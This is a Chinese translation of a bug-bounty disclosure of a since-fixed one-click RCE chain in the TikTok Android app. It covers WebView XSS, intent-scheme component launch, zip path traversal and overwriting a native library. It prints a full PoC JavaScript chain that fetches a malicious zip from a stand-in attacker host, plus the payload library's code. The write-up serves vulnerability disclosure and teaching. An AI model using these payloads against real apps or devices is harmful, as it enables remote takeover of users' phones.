# 赏金$10000+的TikTok Android 1-Click RCE漏洞

阅读量 **360665**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-15 16:30:06

 **x**

##### 译文声明

本文是翻译文章，文章原作者 Sayed Abdelhafiz，文章来源：medium.com

原文地址：<https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01bc0801ed159c4d2f.jpg)

## 0x00 前言

在测试TikTok
Android应用程序时，我发现了多个联结起来实现RCE攻击的漏洞链，这些漏洞同时覆盖多个攻击面。在这篇文章中，我们将分析每个漏洞以及漏洞链。我花了21天对软件进行测试，整个漏洞链挖掘的过程也提高了我的实践测试能力。最后TikTok对漏洞进行了修复，我也对其进行了重新测试，具体漏洞包括：

![](https://p3.ssl.qhimg.com/t01e428440ce308a3c7.png)

1.TikTok WebView 中的通用XSS  
2.AddWikiActivity 中的另一个XSS  
3.任意组件启动  
4.`TmaTestActivity`中的zip拆分包  
5.RCE

## 0x01 WebView 中的通用XSS

TikTok使用一个特定的WebView，它可以被特定的链接或者收信箱消息唤起。这个WebView为了提高性能，在处理falcon链接的方式是从内部文件获取，而不是每次从服务器中获取。出于测试性能的目的，在页面加载完毕后，以下函数被调用：

    
    
    this.a.evaluateJavascript("JSON.stringify(window.performance.getEntriesByName(\'" + this.webviewURL + "\'))", v2);
    

我的首先思路是在url中注入XSS payload，用来逃逸函数调用并执行恶意代码。我首先尝试了以下链接：

    
    
    https://m.tiktok.com/falcon/?'),alert(1));//](https://m.tiktok.com/falcon/?%27),alert(1));//)`
    

很不幸，没有成功被执行。于是，我写了一个Frida脚本勾子去查看`android.webkit.WebView.evaluateJavascript`
方法，发现payload被传递到方法中:

    
    
    JSON.stringify(window.performance.getEntriesByName('https://m.tiktok.com/falcon/?%27)%2Calert(1))%3B%2F%2F'))
    

由于在查询字串中，可以看到payload被编码。于是我在payload中插入`#`,构造`https://m.tiktok.com/falcon/#'),alert(1));//`
，被成功执行如下:

    
    
    JSON.stringify(window.performance.getEntriesByName('https://m.tiktok.com/falcon/#'),alert(1));//'))`
    

于是我们成功获得了一个WebView中通用的XSS，因为只要链接汇总包含像`m.tiktok.com/falcon/`的部分就能执行XSS。例如`https://www.google.com/m.tiktok.com/falcon/`

在发现这个XSS后，我开始在WebView中挖掘，看看有何危害。首先，我设置了自己的实验环境，以便于测试。启用WebViewDebug模用以在开发工具中调试WebView，可以在这里找到模块:
<https://github.com/feix760/WebViewDebugHook>。我发现WebView支持`intent`方案，这个方案可以构建一个自定义intent，并将其作为一个活动启动,这有助于避免对未导出活动的导出设置，最大限度地扩大测试范围。可以阅读这份资料获得更详细的信息：
<https://www.mbsd.jp/Whitepaper/IntentScheme.pdf>。

我尝试执行下列JavaScript代码开启`com.ss.android.ugc.aweme.favorites.ui.UserFavoritesActivity`
活动:

    
    
    location = "intent:#Intent;component=com.zhiliaoapp.musically/com.ss.android.ugc.aweme.favorites.ui.UserFavoritesActivity;package=com.zhiliaoapp.musically;action=android.intent.action.VIEW;end;"
    

但没有发现产生任何影响，于是我回到WebViewClient查看发生了什么，看到以下代码：

    
    
    boolean v0_7 = v0_6 == null ? true : v0_6.hasClickInTimeInterval();
    if((v8.i) && !v0_7) {
        v8.i = false;
        v4 = true;
    }
    else {
        v4 = v0_7;
    }
    

这段代码显限制了`intent`生效，除非用户恰好点击了某些地方。这种2-click的利用方式不好。于是我将继续深挖。  
ToutiaoJSBridge，它是一个在WebView中实现的桥。它有许多fruit功能，其中之一是openSchema，用于打开内部深层链接。有一个叫做aweme://wiki
It用来打开AddWikiActivity WebView上的url。

## 0x02 AddWikiActivity 中的另一个XSS

ToutiaoJSBridge是WebView中实现的桥，具备很多有用的函数，比如`openSchema`用来打开内部的`deep-links`，其中一个连接 `aweme://wiki`可以用来打开`AddWikiActivity` WebView中的url.  
`AddWikiActivity`实现URL验证，以确保没有非法URL被打开，该验证仅在http或https中进行，它认为任何其他方案都是无效的，不需要验证:

    
    
    if(!e.b(arg8)) {
        com.bytedance.t.c.e.b.a("AbsSecStrategy", "needBuildSecLink : url is invalid.");
        return false;
    }
    public static boolean b(String arg1) {
        return !TextUtils.isEmpty(arg1) && ((arg1.startsWith("http")) || (arg1.startsWith("https"))) && !e.a(arg1);
    }
        }
    

该验证不对 `javascript`方案进行验证，这太棒了。我们可以使用这个方案在WebView上执行XSS!

    
    
    window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
        "__callback_id": "0",
        "func": "openSchema",
        "__msg_type": "callback",
        "params": {
            "schema": "aweme://wiki?url=javascript://m.tiktok.com/%250adocument.write(%22%3Ch1%3EPoC%3C%2Fh1%3E%22)&disable_app_link=false"
        },
        "JSSDK": "1",
        "namespace": "host",
        "__iframe_url": "http://iframe.attacker.com/"
    }));
    

最终，`<h1>PoC</h1>` 被展现在WebView上。

## 0x03 任意组件启动

`AddWikiActivity` WebView同样支持`intent`方案，如果将`disable_app_link`参数设为
`false`，将没有任何限制。  
下列代码如果在`AddWikiActivity`中被执行， `UserFavoritesActivity` 就会被调用：  
if the following code got execute in `AddWikiActivity` The will get invoked:

    
    
    location.replace("intent:#Intent;component=com.zhiliaoapp.musically/com.ss.android.ugc.aweme.favorites.ui.UserFavoritesActivity;package=com.zhiliaoapp.musically;action=android.intent.action.VIEW;end;")
    

## 0x04 TmaTestActivity 中的zip拆分包

现在，我们可以打开任何活动，并传递任何信息。我在一个名为`split_df_miniapp.apk`的拆分包中发现了一个名为`TmaTestActivity`活动。拆分包不附加在APK中，而是在应用程序首次启动后被下载。可以通过`adb
shell pm path {package_name}`发现这些包。简而言之，`TmaTestActivity`通过网络下载zip并解压提取来更新SDK。

    
    
    Uri v5 = Uri.parse(Uri.decode(arg5.toString()));
    String v0 = v5.getQueryParameter("action");
    if(m.a(v0, "sdkUpdate")) {
        m.a(v5, "testUri");
        this.updateJssdk(arg4, v5, arg6);
        return;
    }
    

为了调用更新，我们设定`action` 参数为 `sdkUpdate`：

    
    
    private final void updateJssdk(Context arg5, Uri arg6, TmaTestCallback arg7) {
        String v0 = arg6.getQueryParameter("sdkUpdateVersion");
        String v1 = arg6.getQueryParameter("sdkVersion");
        String v6 = arg6.getQueryParameter("latestSDKUrl");
        SharedPreferences.Editor v2 = BaseBundleDAO.getJsSdkSP(arg5).edit();
        v2.putString("sdk_update_version", v0).apply();
        v2.putString("sdk_version", v1).apply();
        v2.putString("latest_sdk_url", v6).apply();
        DownloadBaseBundleHandler v6_1 = new DownloadBaseBundleHandler();
        BundleHandlerParam v0_1 = new BundleHandlerParam();
        v6_1.setInitialParam(arg5, v0_1);
        ResolveDownloadHandler v5 = new ResolveDownloadHandler();
        v6_1.setNextHandler(((BaseBundleHandler)v5));
        SetCurrentProcessBundleVersionHandler v6_2 = new SetCurrentProcessBundleVersionHandler();
        v5.setNextHandler(((BaseBundleHandler)v6_2));
    }
    

它收集SDK的更新信息，并调用`DownloadBaseBundleHandler`实例，然后设置下一个为`ResolveDownloadHandler`，以及`SetCurrentProcessBundleVersionHandler`。  
首先从`DownloadBaseBundleHandler`开始分析。它检测`sdkUpdateVersion`
参数是否比当前值更新。我们设值为99.99.99回避检测，并开始下载：

    
    
    public BundleHandlerParam handle(Context arg14, BundleHandlerParam arg15) {
      .....
        String v0 = BaseBundleManager.getInst().getSdkCurrentVersionStr(arg14);
        String v8 = BaseBundleDAO.getJsSdkSP(arg14).getString("sdk_update_version", "");
        .....
        if(AppbrandUtil.convertVersionStrToCode(v0) >= AppbrandUtil.convertVersionStrToCode(v8) && (BaseBundleManager.getInst().isRealBaseBundleReadyNow())) {
            InnerEventHelper.mpLibResult("mp_lib_validation_result", v0, v8, "no_update", "", -1L);
            v10.appendLog("no need update remote basebundle version");
            arg15.isIgnoreTask = true;
            return arg15;
        }
        .....
        this.startDownload(v9, v10, arg15, v0, v8);
        .....
    

在`startDownload` 模式中发现:

    
    
    v2.a = StorageUtil.getExternalCacheDir(AppbrandContext.getInst().getApplicationContext()).getPath();
    v2.b = this.getMd5FromUrl(arg16);
    

`v2.a`
为下载路径，它从`AppbrandContext`中获得，但必须有一个实例。不幸的是，应用程序并没有一直初始化这个实例。但我花了21天时间研究这些漏洞，对应用程序工作流有清晰的认识，可以利用`ToutiaoJSBridge`调用`preloadMiniApp`函数能够初始化实例。

`v2.b` 下载过程中文件的md5，从文件名获得:

    
    
    private String getMd5FromUrl(String arg3) {
        return arg3.substring(arg3.lastIndexOf("_") + 1, arg3.lastIndexOf("."));
    }
    

文件名应该有这样的格式`anything_{md5sum_of_file}.zip` ，因为需要下载后进行md5的比较：

    
    
    public void onDownloadSuccess(ad arg11) {
        super.onDownloadSuccess(arg11);
        File v11 = new File(this.val$tmaFileRequest.a, this.val$tmaFileRequest.b);
        long v6 = this.val$beginDownloadTime.getMillisAfterStart();
        if(!v11.exists()) {
            this.val$baseBundleEvent.appendLog("remote basebundle download fail");
            this.val$param.isLastTaskSuccess = false;
            this.val$baseBundleEvent.appendLog("remote basebundle not exist");
            InnerEventHelper.mpLibResult("mp_lib_download_result", this.val$localVersion, this.val$latestVersion, "fail", "md5_fail", v6);
        }
        else if(this.val$tmaFileRequest.b.equals(CharacterUtils.md5Hex(v11))) {
            this.val$baseBundleEvent.appendLog("remote basebundle download success, md5 verify success");
            this.val$param.isLastTaskSuccess = true;
            this.val$param.targetZipFile = v11;
            InnerEventHelper.mpLibResult("mp_lib_download_result", this.val$localVersion, this.val$latestVersion, "success", "", v6);
        }
        else {
            this.val$baseBundleEvent.appendLog("remote basebundle md5 not equals");
            InnerEventHelper.mpLibResult("mp_lib_download_result", this.val$localVersion, this.val$latestVersion, "fail", "md5_fail", v6);
            this.val$param.isLastTaskSuccess = false;
        }
    

下载结束后，文件被传递到`ResolveDownloadHandler`中进行解压：

    
    
    public BundleHandlerParam handle(Context arg13, BundleHandlerParam arg14) {
        BaseBundleEvent v0 = arg14.baseBundleEvent;
        if((arg14.isLastTaskSuccess) && arg14.targetZipFile != null && (arg14.targetZipFile.exists())) {
            arg14.bundleVersion = BaseBundleFileManager.unZipFileToBundle(arg13, arg14.targetZipFile, "download_bundle", false, v0);
    public static long unZipFileToBundle(Context arg8, File arg9, String arg10, boolean arg11, BaseBundleEvent arg12) {
        long v10;
        boolean v4;
        Class v0 = BaseBundleFileManager.class;
        synchronized(v0) {
            boolean v1 = arg9.exists();
        }
        if(!v1) {
            return 0L;
        }
        try {
            File v1_1 = BaseBundleFileManager.getBundleFolderFile(arg8, arg10);
            arg12.appendLog("start unzip" + arg10);
            BaseBundleFileManager.tryUnzipBaseBundle(arg12, arg10, v1_1.getAbsolutePath(), arg9);
    private static void tryUnzipBaseBundle(BaseBundleEvent arg2, String arg3, String arg4, File arg5) {
        try {
            arg2.appendLog("unzip" + arg3);
            IOUtils.unZipFolder(arg5.getAbsolutePath(), arg4);
        }
        ......
    }
    public static void unZipFolder(String arg1, String arg2) throws Exception {
        IOUtils.a(new FileInputStream(arg1), arg2, false);
    }
    private static void a(InputStream arg5, String arg6, boolean arg7) throws Exception {
        ZipInputStream v0 = new ZipInputStream(arg5);
        while(true) {
        label_2:
            ZipEntry v5 = v0.getNextEntry();
            if(v5 == null) {
                break;
            }
            String v1 = v5.getName();
            if((arg7) && !TextUtils.isEmpty(v1) && (v1.contains("../"))) { // Are you notice arg7?
                goto label_2;
            }
            if(v5.isDirectory()) {
                new File(arg6 + File.separator + v1.substring(0, v1.length() - 1)).mkdirs();
                goto label_2;
            }
            File v5_1 = new File(arg6 + File.separator + v1);
            if(!v5_1.getParentFile().exists()) {
                v5_1.getParentFile().mkdirs();
            }
            v5_1.createNewFile();
            FileOutputStream v1_1 = new FileOutputStream(v5_1);
            byte[] v5_2 = new byte[0x400];
            while(true) {
                int v3 = v0.read(v5_2);
                if(v3 == -1) {
                    break;
                }
                v1_1.write(v5_2, 0, v3);
                v1_1.flush();
            }
            v1_1.close();
        }
        v0.close();
    }
    

在最后一个用于解压缩文件的方法中，会对路径遍历进行检查，但由于`arg7`值是`false`，所以不会进行检查，这使我们能够利用ZIP拆分包并覆盖一些文件。

## 0x05 RCE

我创建了一个zip文件并遍历路径覆盖  
`/data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so`
文件:

    
    
    dphoeniixx@MacBook-Pro Tiktok % 7z l libran_a1ef01b09a3d9400b77144bbf9ad59b1.zip
    ​
    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,16 CPUs x64)
    ​
    Scanning the drive for archives:
    1 file, 1930 bytes (2 KiB)
    ​
    Listing archive: libran_a1ef01b09a3d9400b77144bbf9ad59b1.zip
    ​
    --    Path = libran_a1ef01b09a3d9400b77144bbf9ad59b1.zip
    Type = zip
    Physical Size = 1930
    ​
       Date      Time    Attr         Size   Compressed  Name
    ------------------- ----- ------------ ------------  ------------------------    2020-11-26 04:08:29 .....         5896         1496  ../../../../../../../../../data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so
    ------------------- ----- ------------ ------------  ------------------------    2020-11-26 04:08:29               5896         1496  1 files
    

现在我们可以用恶意库覆盖本地库来执行代码。不过该方法除非用户重新启动应用程序，否则它不会被执行。我找到了一种无需重新启动就可以重新加载该库的方法，即启动`com.tt.miniapphost.placeholder.MiniappTabActivity0`
活动。  
最终的POC如下：

    
    
    document.title = "Loading..";
    document.write("<h1>Loading..</h1>");
    if (document && window.name != "finished") { // the XSS will be fired multiple time before loading the page and after. this condition to make sure that the payload won't fire multiple time.
        window.name = "finished";
        window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
            "__callback_id": "0",
            "func": "preloadMiniApp",
            "__msg_type": "callback",
            "params": {
                "mini_app_url": "https://microapp/"
            },
            "JSSDK": "1",
            "namespace": "host",
            "__iframe_url": "http://d.c/"
        })); // initialize Mini App
        window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
            "__callback_id": "0",
            "func": "openSchema",
            "__msg_type": "callback",
            "params": {
                "schema": "aweme://wiki?url=javascript:location.replace(%22intent%3A%2F%2Fwww.google.com.eg%2F%3Faction%3DsdkUpdate%26latestSDKUrl%3Dhttp%3A%2F%2F{ATTACKER_HOST}%2Flibran_a1ef01b09a3d9400b77144bbf9ad59b1.zip%26sdkUpdateVersion%3D1.87.1.11%23Intent%3Bscheme%3Dhttps%3Bcomponent%3Dcom.zhiliaoapp.musically%2Fcom.tt.miniapp.tmatest.TmaTestActivity%3Bpackage%3Dcom.zhiliaoapp.musically%3Baction%3Dandroid.intent.action.VIEW%3Bend%22)%3B%0A&noRedirect=false&title=First%20Stage&disable_app_link=false"
            },
            "JSSDK": "1",
            "namespace": "host",
            "__iframe_url": "http://iframe.attacker.com/"
        })); // Download malicious zip file that will overwite /data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so
        setTimeout(function() {
            window.ToutiaoJSBridge.invokeMethod(JSON.stringify({
                "__callback_id": "0",
                "func": "openSchema",
                "__msg_type": "callback",
                "params": {
                    "schema": "aweme://wiki?url=javascript:location.replace(%22intent%3A%23Intent%3Bscheme%3Dhttps%3Bcomponent%3Dcom.zhiliaoapp.musically%2Fcom.tt.miniapphost.placeholder.MiniappTabActivity0%3Bpackage%3Dcom.zhiliaoapp.musically%3BS.miniapp_url%3Dhttps%3Bend%22)%3B%0A&noRedirect=false&title=Second%20Stage&disable_app_link=false"
                },
                "JSSDK": "1",
                "namespace": "host",
                "__iframe_url": "http://iframe.attacker.com/"
            })); // load the malicious library after overwrtting it.
        }, 5000);
    }
    

恶意库包含代码：

    
    
    #include <jni.h>
    #include <string>
    #include <stdlib.h>
    ​
    ​
    JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
        system("id > /data/data/com.zhiliaoapp.musically/PoC");
        return JNI_VERSION_1_6;
    }
    

## 0x06 TikTok修复

TikTok的安全人员最终对漏洞进行了修复，采取了下列操作:  
1.存在漏洞的XSS代码已被删除。  
2.`TmaTestActivity`已被删除。  
3.升级限制，不允许TikTok应用程序中`AddWikiActivity`和`Main WebViewActivity`上应用`intent`方案

本文翻译自medium.com [原文链接](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **米利特瑞先生** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/237120](/post/id/237120)

安全客 - 有思想的安全新媒体

本文转载自: [medium.com](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105)

如若转载,请注明出处： <https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [RCE](/tag/RCE)
  * [TikTok](/tag/TikTok)

 **+1** __4赞

 __收藏

![](https://p5.ssl.qhimg.com/t0125c3f3f3fc1b13fd.png) 米利特瑞先生

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

